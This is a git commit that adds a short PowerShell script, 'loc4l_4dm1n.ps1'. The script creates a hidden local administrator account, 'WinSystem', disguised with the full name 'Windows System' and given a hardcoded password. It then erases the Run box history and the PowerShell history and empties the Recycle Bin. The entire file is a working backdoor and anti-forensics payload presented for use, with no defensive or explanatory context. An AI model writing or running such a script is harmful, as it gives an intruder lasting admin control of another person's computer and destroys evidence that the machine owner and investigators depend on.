93ce47aa48ec0020e9bcb4ca82e9cf937bd67228
Z7Z7Z7Z7Z7Z7Z7Z7Z7Z7Z7Z7Z7Z7 <143813623+Z7Z7Z7Z7Z7Z7Z7Z7Z7Z7Z7Z7Z7Z7@users.noreply.github.com>
2023-09-08 10:55:34 +0200

    Create loc4l_4dm1n.ps1

---
+++ loc4l_4dm1n.ps1
@@ -0,0 +1,11 @@
+# Create local admin username : WinSystem Password : P@ssw0rd
+net user WinSystem P@ssw0rd /add /fullname:"Windows System" /passwordchg:no && net localgroup administrators WinSystem /add
+
+# delete run box history
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
+
+# Delete powershell history
+Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+
+# Empty recycle bin
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
